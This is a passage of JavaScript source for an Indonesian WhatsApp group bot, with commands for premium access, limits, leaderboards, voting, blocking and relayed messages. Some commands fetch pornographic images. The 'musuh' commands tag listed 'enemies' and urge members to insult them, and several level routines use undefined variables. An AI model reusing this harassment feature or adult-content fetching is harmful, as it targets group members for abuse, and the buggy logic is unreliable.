if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break

case 'randombokep':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let datanya = fs.readFileSync('./database/data/18.js')
let jsonData = JSON.parse(datanya);
let Randindex = Math.floor(Math.random() * jsonData.length);
let randKy = jsonData[Randindex];
let randBokep = await getBuffer(randKy.image)
reply(mess.wait)
let randTeks = randKy.teks
surya.sendMessage(from, randBokep, image, {quoted: msg, caption: randTeks})
await limitAdd(sender, limit) 
break

case 'resetlimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
var reset = []
 limit = reset
 console.log('Tunggu sebentar... Saatnya untuk mengatur ulang!')
 fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
 textImg(`Succes ${pushname}`)
 }
break
case 'resetbalance':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
var reset = []
balance = reset
console.log('Tunggu sebentar... Saatnya untuk mengatur ulang!')
fs.writeFileSync('./database/balance.json', JSON.stringify(balance))
textImg(`Succes ${pushname}`)
}
break
case 'resetglimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
var reset = []
 glimit = reset
 console.log('Tunggu sebentar... Saatnya untuk mengatur ulang!')
 fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
 textImg(`Succes ${pushname}`)
 }
break
case 'resetklaim': case 'resetclaim': case 'rc':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
var reset = []
 _claim = reset
 console.log('Tunggu sebentar... Saatnya untuk mengatur ulang!')
 fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
 textImg(`Succes ${pushname}`)
 }
break

case 'delvote':
            if(!msg.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !msg.key.fromMe) return 
            if(!isGroup) return reply(mess.OnlyGrup)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (msg.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || msg.message.extendedTextMessage.contextInfo == null) {
            let id = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
            let split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break

case 'reseth': case 'resethittotal':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
var reset = []
 _totalharian = reset
 console.log('Tunggu sebentar... Saatnya untuk mengatur ulang!')
 fs.writeFileSync('./database/totalharian.json', JSON.stringify(_totalharian))
 textImg(`Succes Surya`)
 }
break

case 'levelb': case 'expb':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGroup && !isLevelingOn) return textImg(`Fitur leveling belum diaktifkan!`)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
const levelnya = `
*──「 LEVEL INFO 」──*

❑ *Name :* ${pushname}
❑ *Tag :* @${sender.split('@')[0]}
❑ *EXP :* ${userXp}
❑ *Level :* ${userLevel}
❑ *Rank :* ${rank}`
const buttons = [{buttonId: 'verify', buttonText: {displayText: `${pushname}`}, type: 1}]
const buttonsMessage = {
contentText: `${levelnya}`,
footerText: `© ᥴrᥱᥲ𝗍ᥱძ mᥱᥴһᥲ ᑲ᥆𝗍z ᑲу @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'sewa':
if (!isGroup)return reply(mess.OnlyGrup)
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
if (args[1].toLowerCase() === 'add'){
_sewa.addSewaGroup(from, args[2], sewa)
reply(`Mecha Botz berhasil di sewa di grup ini selama ${args[2]}

*Note :* Jika waktu sewa sudah habis, botz akan keluar otomatis!`)
} else if (args[1].toLowerCase() === 'del'){
sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
reply(mess.success)
} else {
reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
break
case 'sewalist': case 'listsewa':
let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvipp = ms(i.expired - Date.now())
txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day ${cekvipp.hours} hour ${cekvipp.minutes} minute ${cekvipp.seconds} second\n\n`
}
reply(txtnyee)
break
case 'sewacheck':case 'ceksewa': case 'sewacek':
if (!isGroup) return reply(mess.only.group)
if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
let ceksewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewanya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${ceksewa.days} day ${ceksewa.hours} hour ${ceksewa.minutes} minute ${ceksewa.seconds} second`
reply(sewanya)
break
case 'addprem':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}addprem* @tag waktu
*${prefix}addprem* nomor waktu

Contoh : ${command} @tag 30d`)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
_prem.addPremiumUser(mentioned[0], args[2], premium)
}
reply('Sukses')
} else {
_prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
reply('Sukses')
}
break
case 'delprem':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
premium.splice(_prem.getPremiumPosition(mentioned[i], premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
}
reply('Sukses')
if (isQuotedMsg) {
premium.splice(_prem.getPremiumPosition(quotedMsg.sender, args[1], premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
}
textImg(`Sukses`)
} else {
premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
}
textImg(`Sukses`)
break

case 'cekprem': case 'cekpremium':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let premiumnya = `${cekvip.days} day ${cekvip.hours} hour ${cekvip.minutes} minute ${cekvip.seconds} second`
try {
var ppimg = await surya.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
var ppimg = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
let teksn = `❒ *「 Premium User 」* ❒ 


*Nama : ${pushname}*
 
*Tag : @${sender.split("@")[0]}*
 
*Expired : ${premiumnya}*`
let its = await getBuffer (ppimg)
surya.sendMessage(from, its, image, {contextInfo: { forwardingScore: 9999, isForwarded: false, mentionedJid: [sender]},quoted: msg, caption: teksn
})
break
case 'listprem':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let txt = `List Prem
Jumlah : ${premium.length}

`
let men = [];
for (let i of premium){
men.push(i.id)
let cekvip = ms(i.expired - Date.now())
txt += `*ID :* @${i.id.split("@")[0]}
*Expire :* ${cekvip.days} day ${cekvip.hours} hour ${cekvip.minutes} minute ${cekvip.seconds} second

`
}
mentions(txt, men, true)
break

case 'musuh':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
addMusuh(mentioned[0], args[2], _musuh)
}
textImg('Sukses menambahkan member ke database musuh Surya!')
} else if (isQuotedMsg) {
if (quotedMsg.sender === Suryaa) return textImg(`Tidak bisa menambahkan Creator Surya`)
addMusuh(quotedMsg.sender, args[1], _musuh)
textImg('Sukses menambahkan member ke database musuh Surya!')
}
break
case 'teman':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
delMusuh(mentioned[0], args[2], _musuh)
}
textImg('Sukses menghapus member dari database musuh Surya!')
} else if (isQuotedMsg) {
delMusuh(quotedMsg.sender, args[1], _musuh)
textImg('Sukses menghapus member dari database musuh Surya!')
}
break

case 'c':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
let chat = mentioned[0].toString()
let cht = q.slice(args[1].length + 1, q.length)
surya.sendMessage(chat, `@${sender.split("@")[0]} Mengirimi anda pesan lewat bot
*Pesan :* ${cht}`, text, {contextInfo: {"mentionedJid": [sender]}, quoted:ftroli})
mentions(`Sukses mengirim pesan ke @${mentioned[0].split("@")[0]}
*Pesan :* ${cht}`, [mentioned[0]], true)
}
} else if (isQuotedMsg) {
let cht1 = quotedMsg.sender
surya.sendMessage(cht1, `@${sender.split("@")[0]} Mengirimi anda pesan lewat bot
*Pesan :* ${q}`, text, {contextInfo: {"mentionedJid": [sender]}, quoted:ftroli})
mentions(`Sukses mengirim pesan ke @${cht1.split("@")[0]}
*Pesan :* ${q}`, [quotedMsg.sender], true)

} else if (!isNaN(args[1])) {
let chat1 = args[1] + '@s.whatsapp.net'.toString()
let cht2 = q.slice(args[1].length + 1, q.length)
surya.sendMessage(chat1, `@${sender.split("@")[0]} Mengirimi anda pesan lewat bot
*Pesan :* ${cht2}`, text, {contextInfo: {"mentionedJid": [sender]}, quoted:ftroli})
mentions(`Sukses mengirim pesan ke @${chat1.split("@")[0]}
*Pesan :* ${cht2}`, [chat1], true)
} else {
textImg(`Kirim perintah ${prefix}chats @tag atau nomor atau reply pesan orang yang ingin dikirimi pesan`)
limitAdd(sender, limit)
}
break

case 'unblock': case 'unblok':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
await surya.blockUser(mentioned[i], "remove")
}
reply(`Sukses unblock target`)
}if (isQuotedMsg) {
await surya.blockUser(quotedMsg.sender, "remove")
textImg(`Sukses unblock target`) 
} else if (!isNaN(args[1])) {
await surya.blockUser(args[1] + '@s.whatsapp.net', "remove")
reply(`Sukses unblock target`)
} else {
}
break

case 'block': case 'blok':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
await surya.blockUser(mentioned[i], "add")
}
reply('Sukses block target')
}if (isQuotedMsg) {
await surya.blockUser(quotedMsg.sender, "add")
textImg(`Sukses block target`) 
} else if (!isNaN(args[1])) {
await surya.blockUser(args[1] + '@s.whatsapp.net', "add")
reply('Sukses block target')
} else {
}
break

case 'lb': case 'leaderboard':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGroup && !isLevelingOn) return textImg(`Fitur leveling belum diaktifkan!`)
if (isMuted) return
if (isBan) return 
let top = '*──「 LEADERBOARD LEVEL 」──*\n\n'
let arrTop = []
 var nom = 0
 _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
for (let i = 0; i < 10; i++) {
var ranks = 'Warrior lll'
if (_level[i].level <= 3) {
ranks = 'Warrior ll'
} else if (_level[i].level <= 5) {
ranks = 'Warrior l'
} else if (_level[i].level <= 7) {
ranks = 'Elite lll'
} else if (_level[i].level <= 9) {
ranks = 'Elite ll'
} else if (_level[i].level <= 11) {
ranks = 'Elite l'
} else if (_level[i].level <= 13) {
ranks = 'Master lV'
} else if (_level[i].level <= 15) {
ranks = 'Master lll'
} else if (_level[i].level <= 17) {
ranks = 'Master ll'
} else if (_level[i].level <= 20) {
ranks = 'Master l'
} else if (_level[i].level <= 25) {
ranks = 'Epic V'
} else if (_level[i].level <= 30) {
ranks = 'Epic lV'
} else if (_level[i].level <= 35) {
ranks = 'Epic lll'
} else if (_level[i].level <= 40) {
ranks = 'Epic ll'
} else if (_level[i].level <= 45) {
ranks = 'Epic l'
} else if (_level[i].level <= 50) {
ranks = 'Legend V'
} else if (_level[i].level <= 55) {
ranks = 'Legend lV'
} else if (_level[i].level <= 60) {
ranks = 'Legend lll'
} else if (_level[i].level <= 65) {
ranks = 'Legend ll'
} else if (_level[i].level <= 70) {
ranks = 'Legend l'
} else if (_level[i].level <= 75) {
ranks = 'Mythic V'
} else if (_level[i].level <= 80) {
ranks = 'Mythic lV'
} else if (_level[i].level <= 85) {
ranks = 'Mythic lll'
} else if (_level[i].level <= 90) {
ranks = 'Mythic ll'
} else if (_level[i].level <= 95) {
ranks = 'Mythic l'
} else if (_level[i].level <= 100) {
ranks = 'Mythical Glory'
} else if (levelRole <= 101) {
ranks = 'Mythical Glory'
} else if (levelRole <= 104) {
ranks = 'Mythical Glory ★400'
} else if (levelRole <= 107) {
ranks = 'Mythical Glory ★700'
} else if (levelRole <= 109) {
ranks = 'Mythical Glory ★900'
} else if (levelRole <= 112) {
ranks = 'Mythical Glory ★1200'
} else if (levelRole <= 115) {
ranks = 'Mythical Glory ★1500'
} else if (levelRole <= 118) {
ranks = 'Mythical Glory ★1800'
} else if (levelRole <= 121) {
ranks = 'Mythical Glory ★2100'
} else if (levelRole <= 124) {
ranks = 'Mythical Glory ★2400'
} else if (levelRole <= 127) {
ranks = 'Mythical Glory ★2700'
} else if (levelRole <= 130) {
ranks = 'Mythical Glory ★3000'
} else if (levelRole <= 133) {
ranks = 'Mythical Glory ★4300'
} else if (levelRole <= 136) {
ranks = 'Mythical Glory ★4600'
} else if (levelRole <= 139) {
ranks = 'Mythical Glory ★4900'
} else if (levelRole <= 142) {
ranks = 'Mythical Glory ★4200'
} else if (levelRole <= 145) {
ranks = 'Mythical Glory ★4500'
} else if (levelRole <= 148) {
ranks = 'Mythical Glory ★4800'
} else if (levelRole <= 151) {
ranks = 'Mythical Glory ★5100'
} else if (levelRole <= 154) {
ranks = 'Mythical Glory ★5400'
} else if (levelRole <= 157) {
ranks = 'Mythical Glory ★5700'
}
arrTop.push(_level[i].jid)
nom++
top += `
◪ *${nom}. @${_level[i].id.replace('@s.whatsapp.net', '')}*
├❑ *EXP: ${_level[i].xp}*
├❑ *Level: ${_level[i].level}*
└❑ *Role: ${ranks}*\n\n`
}
 let topp = '*── 「 TOPGLOBAL BALANCE 」 ──*\n\n'
 balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
for (let i = 0; i < 10; i ++){
topp += `
◪ *${i + 1}. @${balance[i].id.split("@")[0]}*
└❑ *Balance : $${balance[i].balance}*\n\n`
arrTop.push(balance[i].id)
}
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let toppp = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
let anggroup = groupMembers.map(a => a.jid)
for (let i = 0; i < balance.length; i ++){
if (anggroup.includes(balance[i].id)) {
toppp += `
◪ *${i + 1}. @${balance[i].id.split("@")[0]}*
└❑ *Balance : $${balance[i].balance}*\n\n`
arrTop.push(balance[i].id)
}
}
mentions(top + '\n\n' + topp + '\n\n' + toppp, arrTop, true)
}
break

case 'topexp': case 'toplevel':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGroup && !isLevelingOn) return textImg(`Fitur leveling belum diaktifkan!`)
if (isMuted) return
if (isBan) return 
const resp = _level
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let toplevel = '*──[ TOP LEVEL ]──*\n\n'
let arrTop = []
for (let i = 0; i < 99; i++) {
var ranks = 'Warrior V'
if (resp[i].level <= 4) {
ranks = 'Warrior IV'
} else if (resp[i].level <= 7) {
ranks = 'Warrior III'
} else if (resp[i].level <= 10) {
ranks = 'Warrior II'
} else if (resp[i].level <= 13) {
ranks = 'Warrior I'
} else if (resp[i].level <= 16) {
ranks = 'Elite V'
} else if (resp[i].level <= 19) {
ranks = 'Elite IV'
} else if (resp[i].level <= 22) {
ranks = 'Elite III'
} else if (resp[i].level <= 25) {
ranks = 'Elite II'
} else if (resp[i].level <= 28) {
ranks = 'Elite I'
} else if (resp[i].level <= 31) {
ranks = 'Master V'
} else if (resp[i].level <= 34) {
ranks = 'Master IV'
} else if (resp[i].level <= 37) {
ranks = 'Master III'
} else if (resp[i].level <= 40) {
ranks = 'Master II'
} else if (resp[i].level <= 43) {
ranks = 'Master I'
} else if (resp[i].level <= 46) {
ranks = 'GrandMaster V'
} else if (resp[i].level <= 49) {
ranks = 'GrandMaster IV'
} else if (resp[i].level <= 52) {
ranks = 'GrandMaster III'
} else if (resp[i].level <= 55) {
ranks = 'GrandMaster II'
} else if (resp[i].level <= 58) {
ranks = 'GrandMaster I'
} else if (resp[i].level <= 61) {
ranks = 'Epic V'
} else if (resp[i].level <= 64) {
ranks = 'Epic IV'
} else if (resp[i].level <= 67) {
ranks = 'Epic III'
} else if (resp[i].level <= 70) {
ranks = 'Epic II'
} else if (resp[i].level <= 73) {
ranks = 'Epic I'
} else if (resp[i].level <= 76) {
ranks = 'Legend V'
} else if (resp[i].level <= 79) {
ranks = 'Legend IV'
} else if (resp[i].level <= 82) {
ranks = 'Legend III'
} else if (resp[i].level <= 85) {
ranks = 'Legend II'
} else if (resp[i].level <= 88) {
ranks = 'Mythic V'
} else if (resp[i].level <= 91) {
ranks = 'Mythic IV'
} else if (resp[i].level <= 94) {
ranks = 'Mythic lll'
} else if (resp[i].level <= 97) {
ranks = 'Mythic ll'
} else if (resp[i].level <= 100) {
ranks = 'Mythic I'
} else if (resp[i].level <= 101) {
ranks = 'Mythical Glory'
} else if (resp[i].level <= 104) {
ranks = 'Mythical Glory ★400'
} else if (resp[i].level <= 107) {
ranks = 'Mythical Glory ★700'
} else if (resp[i].level <= 109) {
ranks = 'Mythical Glory ★900'
} else if (resp[i].level <= 112) {
ranks = 'Mythical Glory ★1200'
} else if (resp[i].level <= 115) {
ranks = 'Mythical Glory ★1500'
} else if (resp[i].level <= 118) {
ranks = 'Mythical Glory ★1800'
} else if (resp[i].level <= 121) {
ranks = 'Mythical Glory ★2100'
} else if (resp[i].level <= 124) {
ranks = 'Mythical Glory ★2400'
} else if (resp[i].level <= 127) {
ranks = 'Mythical Glory ★2700'
} else if (resp[i].level <= 130) {
ranks = 'Mythical Glory ★3000'
} else if (resp[i].level <= 133) {
ranks = 'Mythical Glory ★4300'
} else if (resp[i].level <= 136) {
ranks = 'Mythical Glory ★4600'
} else if (resp[i].level <= 139) {
ranks = 'Mythical Glory ★4900'
} else if (resp[i].level <= 142) {
ranks = 'Mythical Glory ★4200'
} else if (resp[i].level <= 145) {
ranks = 'Mythical Glory ★4500'
} else if (resp[i].level <= 148) {
ranks = 'Mythical Glory ★4800'
} else if (resp[i].level <= 151) {
ranks = 'Mythical Glory ★5100'
} else if (resp[i].level <= 154) {
ranks = 'Mythical Glory ★5400'
} else if (resp[i].level <= 157) {
ranks = 'Mythical Glory ★5700'
}
toplevel += `
◪ *${i + 1}. @${_level[i].id.replace('@s.whatsapp.net', '')}*
├❑ *Xp :* ${_level[i].xp}
├❑ *Level :* ${_level[i].level}
└❑ *Role :* ${ranks}\n\n`
arrTop.push(_level[i].id)
}
mentions(toplevel, arrTop, true)
break

case 'topglobal':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let topglobal = `*── 「 TOP GLOBAL 」 ──*\n\n`
let arrTop = []
for (let i = 0; i < 100; i ++){
topglobal += `
◪ *${i + 1}. @${balance[i].id.split("@")[0]}*
└❑ *Balance : $${balance[i].balance}*\n\n`
arrTop.push(balance[i].id)
}
mentions(topglobal, arrTop, true)
}
break

case 'listregis': case 'listregister': case 'totalregister': case 'registerlist':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
//if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
_registered.sort((a, b) => (a._registered < b._registered) ? 1 : -1)
let totalregister = ` *── 「 REGISTER DATABASE 」 ──*\n\n*Total Register : ${_registered.length}*\n`
let arrTop = []
for (let i = 0; i < _registered.length; i ++){
totalregister += `
◪ *${i + 1}. @${_registered[i].id.split("@")[0]}*
├❑ *Nama :* ${_registered[i].name}
├❑ *Serial :* ${_registered[i].serial}
└❑ *Waktu verifikasi :* ${_registered[i].time}\n`
arrTop.push(_registered[i].id)
}
mentions(totalregister, arrTop, true)
}
break

case 'listafk': case 'afklist':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
_afk.sort((a, b) => (a._afk < b._afk) ? 1 : -1)
let totalAfk = ` *── 「 AFK DATABASE 」 ──*\n\n*Total Afk : ${_afk.length}*\n`
let arrTop = []
for (let i = 0; i < _afk.length; i ++){
totalAfk += `
◪ *${i + 1}. @${_afk[i].id.split("@")[0]}*
├❑ *Alasan :* ${_afk[i].reason}
└❑ *Waktu :* _*${_afk[i].time}*_\n`
arrTop.push(_afk[i].id)
}
mentions(totalAfk, arrTop, true)
}
break

case 'listcount': case 'listcountkasar':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
_senbadword.sort((a, b) => (a._sendbadword < b._senbadword) ? 1 : -1)
let totalBad = ` *─ 「 COUNT KASAR DATABASE 」 ─*\n\n*Total : ${_senbadword.length}*\n`
let arrTop = []
for (let i = 0; i < _senbadword.length; i ++){
totalBad += `
◪ *${i + 1}. @${_senbadword[i].id.split("@")[0]}*
└❑ *Count kasar :* ${_senbadword[i].count}\n`
arrTop.push(_senbadword[i].id)
}
mentions(totalBad, arrTop, true)
}
break

case 'listh': case 'listtotalharian':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
//_totalharian.sort((a, b) => (a._totalharian < b._totalharian) ? 1 : -1)
let totalharian = ` *── 「 TOTAL HIT DATABASE 」 ──*\n\n*Total Hit Harian : ${_totalharian.length}*\n`
let nom = 0
for (let heheh of _totalharian) {
nom += 1
totalharian += `*${nom.toString()}.* ${heheh.split('@')[0]}\n`
}
mentions(totalharian, _totalharian, true)
}
break

case 'musuhsurya': case 'musuhs': case 'bebansurya': case 'bebans':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!fromMe && !isOwner && !isOwner2)return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
//if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
let totalMusuh = `Nih musuhnya Surya\nKasarin aja!\n\n`
for (let hehe of _musuh) {
totalMusuh += `➪ @${hehe.split('@')[0]}\n`
}
mentions(totalMusuh, _musuh, true)
}
break

case 'toplokal': case 'toplocal':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
